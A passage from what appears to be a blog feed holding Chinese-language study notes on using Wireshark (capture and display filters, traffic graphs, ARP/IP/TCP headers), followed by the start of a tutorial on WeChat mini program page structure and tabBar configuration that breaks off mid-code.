id="查找：Ctrl-F"><a href="#查找：Ctrl-F" class="headerlink" title="查找：Ctrl+F"></a>查找：Ctrl+F</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132521210.png" alt="image-20200508132521210"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132626625.png" alt="image-20200508132626625"></p><table><thead><tr><th>搜索类型</th><th>例子</th></tr></thead><tbody><tr><td>Display filter 表达式筛选</td><td>Not ip<br />Ip.addr&#x3D;&#x3D;192.168.0.1 <br />Ar</td></tr><tr><td>Hex Value 十六进制值筛选</td><td>00:ff<br />Ff:ff <br />00?b1:f</td></tr><tr><td>String 字符串筛选</td><td>Workstation1<br />UserB <br />Domain</td></tr></tbody></table><h4 id="标记：Ctrl-M-或右键菜单"><a href="#标记：Ctrl-M-或右键菜单" class="headerlink" title="标记：Ctrl+M 或右键菜单"></a>标记：Ctrl+M 或右键菜单</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132708970.png" alt="image-20200508132708970"></p><h4 id="时间显示格式"><a href="#时间显示格式" class="headerlink" title="时间显示格式"></a>时间显示格式</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132731883.png" alt="image-20200508132731883"></p><h4 id="相对时间：Ctrl-T"><a href="#相对时间：Ctrl-T" class="headerlink" title="相对时间：Ctrl+T"></a>相对时间：Ctrl+T</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132755763.png" alt="image-20200508132755763"></p><h4 id="捕获选项：Ctrl-K"><a href="#捕获选项：Ctrl-K" class="headerlink" title="捕获选项：Ctrl+K"></a>捕获选项：Ctrl+K</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132816479.png" alt="image-20200508132816479"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508132838125.png" alt="image-20200508132838125"></p><h4 id="名字解析"><a href="#名字解析" class="headerlink" title="名字解析"></a>名字解析</h4><h6 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h6><ul><li>MAC 地址解析(Resolve MAC addresses):MAC 转换成IP</li><li>网络层名字解析(Resolve network-layer names):IP 转换成DNS 名称(网址)</li><li>传输层名字解析(Resolve transport-layer names):将端口转换成协议</li><li>使用外部网络名称解析器（Use external network name resolver)</li></ul><h6 id="弊端"><a href="#弊端" class="headerlink" title="弊端"></a>弊端</h6><ul><li>解析可能失败；</li><li>打开捕获文件都要重新解析一遍；</li><li>解析DNS 名字会产生额外流量；</li><li>解析过程占用系统资源。</li></ul><h4 id="协议解析"><a href="#协议解析" class="headerlink" title="协议解析"></a>协议解析</h4><p>右键点击数据包，选择Decode As，创建强制解码器，比如可以强制将80 端口解析成FTP 协议，点击Clear 可清除强制解码器。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133213717.png" alt="image-20200508133213717"></p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><h6 id="过滤器BPF-语法"><a href="#过滤器BPF-语法" class="headerlink" title="过滤器BPF 语法"></a>过滤器BPF 语法</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133637658.png" alt="image-20200508133637658"></p><p>逻辑运算符：与&amp;&amp;或||非!</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133716462.png" alt="image-20200508133716462"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508133743486.png" alt="image-20200508133743486"></p><table><thead><tr><th>表达式</th><th>说明</th></tr></thead><tbody><tr><td>Src 192.168.0.10 &amp;&amp; port 80</td><td>捕获源地址是192.168.0.10 和源端口或目标端口是80 的流量</td></tr><tr><td>Host 172.16.16.149</td><td>捕获某个 IP 的计算机的流</td></tr><tr><td>Host testserver2</td><td>捕获某个主机名的计算机的流量</td></tr><tr><td>Ether host 00-1a-a0-52-e2-a0</td><td>捕获某个 MAC 地址的计算机的流量</td></tr><tr><td>Src host 172.16.16.149</td><td>捕获来自某台计算机的流量</td></tr><tr><td>Dst host 172.16.16.149</td><td>捕获前往某台计算机的流量</td></tr><tr><td>Port 8080</td><td>捕获指定端口的流量</td></tr><tr><td>!port 8080</td><td>捕获除指定端口以外的所有流量</td></tr><tr><td>Dst port 80</td><td>捕获前往监听 HTTP 80 端口的流量</td></tr><tr><td>icmp</td><td>捕获指定协议的流量</td></tr><tr><td>!ip6</td><td>捕获排除 IPv6 的流量</td></tr><tr><td>Icmp[0]&#x3D;&#x3D;3</td><td>捕获偏移量为0 值为3（目标不可达）的 ICMP 数据包流量</td></tr><tr><td>Icmp[0]&#x3D;&#x3D;8 or icmp[0]&#x3D;&#x3D;0</td><td>捕获代表 echo 请求（类型8）或 echo 回复（类型0）的 ICMP 数据包流量</td></tr><tr><td>Icmp[0:2]&#x3D;&#x3D;0x0301</td><td>捕获以类型3 代码1 表示的目标不可达、主机不可达的 ICMP 数据包流量</td></tr><tr><td>Tcp[13]&amp;1&#x3D;&#x3D;1</td><td>捕获设置了 FIN 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;2&#x3D;&#x3D;2</td><td>捕获设置了 SYN 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;4&#x3D;&#x3D;4</td><td>捕获设置了 RST 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;8&#x3D;&#x3D;8</td><td>捕获设置了 PSH 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;16&#x3D;&#x3D;16</td><td>捕获设置了 ACK 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&amp;32&#x3D;&#x3D;32</td><td>捕获设置了 URG 位的 TCP 数据包</td></tr><tr><td>Tcp[13]&#x3D;&#x3D;18</td><td>捕获 TCP SYN-ACK 数据包</td></tr><tr><td>Ether host 00:00:00:00:00:00</td><td>捕获流入或流出你 MAC 地址的流量</td></tr><tr><td>!ether host 00:00:00:00:00:00</td><td>捕获流入或流出你 MAC 地址以外的流量</td></tr><tr><td>Broadcast</td><td>捕获广播流量</td></tr><tr><td>Udp</td><td>捕获 UDP 流量</td></tr></tbody></table><h6 id="显示过滤器"><a href="#显示过滤器" class="headerlink" title="显示过滤器"></a>显示过滤器</h6><p>可以通过设置自带的过滤表达式来过滤显示数据</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134355154.png" alt="image-20200508134355154"></p><h6 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134416613.png" alt="image-20200508134416613"></p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;&#x3D;</td><td>等于</td></tr><tr><td>!&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&lt;&#x3D;</td><td>小于或等于</td></tr><tr><td>&gt;&#x3D;</td><td>大于或等于</td></tr></tbody></table><h6 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134558038.png" alt="image-20200508134558038"></p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>And</td><td>两个条件需同时满足</td></tr><tr><td>Or</td><td>其中一个条件被满足</td></tr><tr><td>Xor</td><td>有且仅有一个条件被满足</td></tr><tr><td>Not</td><td>没有条件被满足</td></tr></tbody></table><h6 id="过滤器举例"><a href="#过滤器举例" class="headerlink" title="过滤器举例"></a>过滤器举例</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508134805125.png" alt="image-20200508134805125"></p><table><thead><tr><th>过滤器</th><th>说明</th></tr></thead><tbody><tr><td>!tcp.port&#x3D;&#x3D;3389</td><td>排除 RDP 流量</td></tr><tr><td>Tcp.flags.syn&#x3D;&#x3D;1</td><td>具有 SYN 标志位的 TCP 数据包</td></tr><tr><td>Tcp.flags.rst&#x3D;&#x3D;1</td><td>具有 RST 标志位的 TCP 数据包</td></tr><tr><td>!arp</td><td>排除 ARP 流量</td></tr><tr><td>http</td><td>所有 HTTP 流量</td></tr><tr><td>Tcp.port&#x3D;&#x3D;23|| tcp.port&#x3D;&#x3D;21</td><td>文本管理流量（telnet 或 ftp）</td></tr><tr><td>Smtp|| pop || imap</td><td>文本 email 流量</td></tr><tr><td>Ip.addr&#x3D;&#x3D;192.168.1.1</td><td>指定 IP 流量</td></tr><tr><td>Frame.len&lt;&#x3D;128</td><td>长度小于等于128 字节的数据包</td></tr></tbody></table><h2 id="流量分析和图形化功能"><a href="#流量分析和图形化功能" class="headerlink" title="流量分析和图形化功能"></a>流量分析和图形化功能</h2><h4 id="网络端点"><a href="#网络端点" class="headerlink" title="网络端点"></a>网络端点</h4><p>统计每个端点的地址、发送或收到的数据包的数量和字节数</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135314004.png" alt="image-20200508135314004"></p><h4 id="网络会话"><a href="#网络会话" class="headerlink" title="网络会话"></a>网络会话</h4><p>统计地址A 和地址B 端点间会话的发送或收到的数据包的数量和字节数。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135359224.png" alt="image-20200508135359224"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135409193.png" alt="image-20200508135409193"></p><h4 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h4><p>可查看各种协议的分布统计情况。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135516681.png" alt="image-20200508135516681"></p><h4 id="数据包长度分析"><a href="#数据包长度分析" class="headerlink" title="数据包长度分析"></a>数据包长度分析</h4><p>以太网帧最大长度为1518 字节，图中较大数据包（1280<del>2559）常用于传输数据，较小的（40</del>79）则是协议控制序列，一个TCP 控制数据包大约在54 字节。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135832083.png" alt="image-20200508135832083"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508135910553.png" alt="image-20200508135910553"></p><h4 id="跟踪TCP流"><a href="#跟踪TCP流" class="headerlink" title="跟踪TCP流"></a>跟踪TCP流</h4><p>红色表示从源地址前往目标地址的流量，蓝色相反。最初是对WEB 根目录的GET 请求，然后是来自服务器的一个用HTTP&#x2F;1.1 200 OK 表示请求成功的响应。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140025257.png" alt="image-20200508140025257"></p><h4 id="图形展示"><a href="#图形展示" class="headerlink" title="图形展示"></a>图形展示</h4><h6 id="查看IO图"><a href="#查看IO图" class="headerlink" title="查看IO图"></a>查看IO图</h6><p>通过选择X 轴（数据包间隔时间）、Y 轴（数据包数量上限）来调整显示的IO 图形，图中显示每团体传输0~200 个数据包之间，且波动很大，表示是一个慢速下载过程。通过过滤器可以将不同流量以不同颜色显示IO 图形对比</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140151578.png" alt="image-20200508140151578"></p><h6 id="双向时间图"><a href="#双向时间图" class="headerlink" title="双向时间图"></a>双向时间图</h6><p>基于两个端口间TCP 连接对话，确认数据包已被成功接收所需的时间，可与对话统计配合使用</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140259289.png" alt="image-20200508140259289"></p><p>图中每一个点都代表了一个数据包的双向时间，单击任何一点可以在Packet List 面板中看到相应数据包；</p><p>图中显示大部分数据多在0.05s 以下，少量在0.10~0.25s 间，对于慢速下载（看网页、微博等）来说是可以接受的</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140327267.png" alt="image-20200508140327267"></p><h6 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h6><p>对于连接可视化，以及将一段时间中的数据流显示出来，配合对话统计使用，可查看两端点间的数据流。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508140747447.png" alt="image-20200508140747447"></p><h4 id="专家信息"><a href="#专家信息" class="headerlink" title="专家信息"></a>专家信息</h4><h6 id="数据包标记"><a href="#数据包标记" class="headerlink" title="数据包标记"></a>数据包标记</h6><p>警告信息：不正常通信中的异常数据包</p><ul><li>丢失：上一段数据包丢失时</li><li>延收：已确认丢失的数据包，又收到了其ACK 包时</li><li>保活：当一个连接的保活数据包出现时</li><li>零窗：接收方达到窗口大小，发出一个零窗口通知时</li><li>乱序：当数据包被乱序接收时</li><li>重传：一次重传会在收到一个重复ACK 的20 毫秒内进行</li></ul><p>注意消息：正常通信中的异常数据包</p><ul><li>重传：收到重复的ACK 或重传计时器超时时</li><li>重复ACK：当主机没有收到下一个期望序列号的数据包时，会生成最近收到数据的重复ACK</li><li>零窗探查：零窗口通知包发出后，用来监视TCP 接收窗口的状态</li><li>保活ACK：用来响应保活数据包</li><li>零窗ACK：用来响应零窗口探查数据包</li><li>窗口已满：通知传输主机其接收者的TCP 接收窗口已满</li></ul><p>对话消息：关于通信的基本信息</p><ul><li>窗口更新：接收者发出，通知发送者TCP 接收窗口大小已被改变</li></ul><h6 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508141655240.png" alt="image-20200508141655240"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508141748503.png" alt="image-20200508141748503"></p><h2 id="通用底层网络协议"><a href="#通用底层网络协议" class="headerlink" title="通用底层网络协议"></a>通用底层网络协议</h2><h4 id="地址解析协议ARP（Address-Resolution-Protocol）"><a href="#地址解析协议ARP（Address-Resolution-Protocol）" class="headerlink" title="地址解析协议ARP（Address Resolution Protocol）"></a>地址解析协议ARP（Address Resolution Protocol）</h4><h6 id="ARP头"><a href="#ARP头" class="headerlink" title="ARP头"></a>ARP头</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508142533600.png" alt="image-20200508142533600"></p><h6 id="数据包分析-1"><a href="#数据包分析-1" class="headerlink" title="数据包分析"></a>数据包分析</h6><p>长度：8 位&#x2F;字节，MAC 地址48 位，即6 字节，IP 地址32 位，即4 字节。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508142658491.png" alt="image-20200508142658491"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508203109003.png" alt="image-20200508203109003"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508203125110.png" alt="image-20200508203125110"></p><h6 id="无偿的ARP"><a href="#无偿的ARP" class="headerlink" title="无偿的ARP"></a>无偿的ARP</h6><p>当IP 地址改变后，网络主机中缓存的IP 和MAC 映射就失效了，为了防止通信错误， 无偿ARP 请求被发送到网络中，强制所有收到它的设备更新ARP 映射缓存。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508203209281.png" alt="image-20200508203209281"></p><h4 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h4><h6 id="IP头"><a href="#IP头" class="headerlink" title="IP头"></a>IP头</h6><p>服务类型：优先级标志位和服务类型标志位，用来进行QoS 标识符：识别一个数据包或被分片数据包的次序，唯一 标记：标记数据包是否是一组分片数据包的一部分 分片偏移：该数据包是个分片，数据包按分片偏移值顺序重组 存活时间TTL：超过TTL 时间，数据包将被丢弃</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.net/img/image-20200508230648007.png" alt="image-20200508230648007"></p><h6 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h6><p>IP 用于解决跨越不同类型网络时可靠传输的一个特性：将一个数据流分为更小的片段。</p><p>基于第2 层数据链路协议所使用的最大传输单元MTU（Maximum Transmission Unit）的大小， 默认是1500 字节（不包含14 字节的以太网头本身），当数据包大小大于MTU 时会被分片。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144125483.png" alt="image-20200609144125483"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144259764.png" alt="image-20200609144259764"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144324142.png" alt="image-20200609144324142"></p><h4 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h4><p>作用:</p><p>为数据提供可靠的端到端传输，处理数据的顺序和错误恢复，保证 数据能够到达其应到达的地方</p><h6 id="TCP头"><a href="#TCP头" class="headerlink" title="TCP头"></a>TCP头</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609144536031.png" alt="image-20200609144536031"></p><p>序号：表示一个TCP 片段。 </p><p>确认号：希望从另一个设备得到的下一个数据包的序号。 </p><p>紧急指针：如果设置了URG 位，紧急指针将告诉CPU 从数据包 的哪里开始读取数据。</p><h6 id="TCP-端口"><a href="#TCP-端口" class="headerlink" title="TCP 端口"></a>TCP 端口</h6><ul><li>1~1023：标准端口组，特定服务会用到标准端口。 </li><li>1024~65535：临时端口组，操作系统会随机地选择一个源端口让某个通信单独 使用。</li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151143156.png" alt="image-20200609151143156"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151202646.png" alt="image-20200609151202646"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151230714.png" alt="image-20200609151230714"></p><h6 id="TCP标志"><a href="#TCP标志" class="headerlink" title="TCP标志"></a>TCP标志</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151259303.png" alt="image-20200609151259303"></p><h6 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151424872.png" alt="image-20200609151424872"></p><p>设置TCP 数据包序列号显示方式;</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200609151444821.png" alt="image-20200609151444821"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Mini Program Development[1]</title>
      <link href="/2020/03/20/Introduction-to-Mini-Program-Development/"/>
      <url>/2020/03/20/Introduction-to-Mini-Program-Development/</url>
      
        <content type="html"><![CDATA[<p>腾讯校园技术布道师</p><h1 id="小程序开发入门"><a href="#小程序开发入门" class="headerlink" title="小程序开发入门"></a>小程序开发入门</h1><h2 id="0x01-文件结构与页面组成"><a href="#0x01-文件结构与页面组成" class="headerlink" title="0x01 文件结构与页面组成"></a>0x01 文件结构与页面组成</h2><h3 id="0x001-小程序的页面组成"><a href="#0x001-小程序的页面组成" class="headerlink" title="0x001 小程序的页面组成"></a>0x001 小程序的页面组成</h3><p>在每一个页面文件夹里都有<strong>四个文件</strong>，这四个文件的名称都是一样的，它们分别为：</p><ul><li><strong>json文件</strong>，和上面的app.json作用基本相同，只是app.json控制的是整个小程序的设置，而页面的json文件只控制单个页面的配置（因为有时候全局配置就够用了，所以页面配置有时候是空的）；</li><li><strong>wxml文件</strong>，小程序的页面结构，文字、图片、音乐、视频、地图、轮播等组件都会放在这里；</li><li><strong>wxss文件</strong>，小程序的页面样式，和app.wxss一样是控制样式，而页面的wxss文件是控制单个页面的样式；</li><li><strong>js文件</strong>，这个是控制小程序页面的逻辑（这个可以先放着，不用管）</li></ul><h3 id="0x002-pages"><a href="#0x002-pages" class="headerlink" title="0x002 pages"></a>0x002 pages</h3><p>用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对于位置的 <code>.json</code>, <code>.js</code>, <code>.wxml</code>, <code>.wxss</code> 四个文件进行处理。</p><p><strong>数组的第一项代表小程序的初始页面（首页）。小程序中新增&#x2F;减少页面，都需要对 pages 数组进行修改。</strong></p><p>如开发目录为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├── app.js</span><br><span class="line">├── app.json</span><br><span class="line">├── app.wxss</span><br><span class="line">├── pages</span><br><span class="line">│   │── index</span><br><span class="line">│   │   ├── index.wxml</span><br><span class="line">│   │   ├── index.js</span><br><span class="line">│   │   ├── index.json</span><br><span class="line">│   │   └── index.wxss</span><br><span class="line">│   └── logs</span><br><span class="line">│       ├── logs.wxml</span><br><span class="line">│       └── logs.js</span><br><span class="line">└── utils</span><br></pre></td></tr></table></figure><p>则需要在 app.json 中写</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;pages/index/index&quot;</span><span class="punctuation">,</span><span class="string">&quot;pages/logs/logs&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-字体属性"><a href="#0x003-字体属性" class="headerlink" title="0x003 字体属性"></a>0x003 字体属性</h3><table><thead><tr><th align="center">字体属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">font-family</a></td><td>规定文本的字体系列。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">font-size</a></td><td>规定文本的字体尺寸。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">font-weight</a></td><td>规定字体的粗细。</td></tr><tr><td align="center">文本属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_color.asp">color</a></td><td>设置文本的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_dim_line-height.asp">line-height</a></td><td>设置行高。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_text_text-align.asp">text-align</a></td><td>规定文本的水平对齐方式。</td></tr></tbody></table><h3 id="0x004-边框属性"><a href="#0x004-边框属性" class="headerlink" title="0x004 边框属性"></a>0x004 边框属性</h3><table><thead><tr><th align="center">内边距属性</th><th></th></tr></thead><tbody><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-family.asp">padding</a></td><td>在一个声明中设置所有内边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_font-size.asp">padding-top</a></td><td>设置元素的上内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-right</a></td><td>设置元素的右内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-bottom</a></td><td>设置元素的下内边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_font_weight.asp">padding-left</a></td><td>设置元素的左内边距。</td></tr><tr><td align="center">外边距属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin.asp">margin</a></td><td>在一个声明中设置所有外边距属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-top.asp">margin-top</a></td><td>设置元素的上外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-right.asp">margin-right</a></td><td>设置元素的右外边距</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-bottom.asp">margin-bottom</a></td><td>设置元素的下外边距。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_margin-left.asp">margin-left</a></td><td>设置元素的左外边距。</td></tr><tr><td align="center">边框属性</td><td></td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border.asp">border</a></td><td>在一个声明中设置所有的边框属性。比如border:1px solid #ccc;</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-top.asp">border-top</a></td><td>在一个声明中设置所有的上边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-right.asp">border-right</a></td><td>在一个声明中设置所有的右边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-bottom.asp">border-bottom</a></td><td>在一个声明中设置所有的下边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-left.asp">border-left</a></td><td>在一个声明中设置所有的左边框属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-width.asp">border-width</a></td><td>设置四条边框的宽度。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-style.asp">border-style</a></td><td>设置四条边框的样式。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-color.asp">border-color</a></td><td>设置四条边框的颜色。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_border-radius.asp">border-radius</a></td><td>简写属性，设置所有四个 border-*-radius 属性。</td></tr><tr><td align="center"><a href="http://www.w3school.com.cn/cssref/pr_box-shadow.asp">box-shadow</a></td><td>向方框添加一个或多个阴影。</td></tr></tbody></table><p><code>padding</code>设置内边距属性</p><p>代码执行顺序上、右、下、左<code>padding-top,padding-right,padding-bottom.padding-left</code></p><p>嵌入小程序底标，先新建图标文件价，放入图标，在app.json中引入</p><h3 id="0x005-icon资源"><a href="#0x005-icon资源" class="headerlink" title="0x005 icon资源"></a>0x005 icon资源</h3><p><a href="http://www.iconfont.cn/">iconfont阿里巴巴矢量图标库</a></p><h3 id="0x006-tabBar"><a href="#0x006-tabBar" class="headerlink" title="0x006 tabBar"></a>0x006 tabBar</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;tabBar&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#7A7E83&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;selectedColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#13227a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;backgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffffff&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/home/home&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;首页&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pages/gradient/gradient&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab2.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/icon-tab2.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span 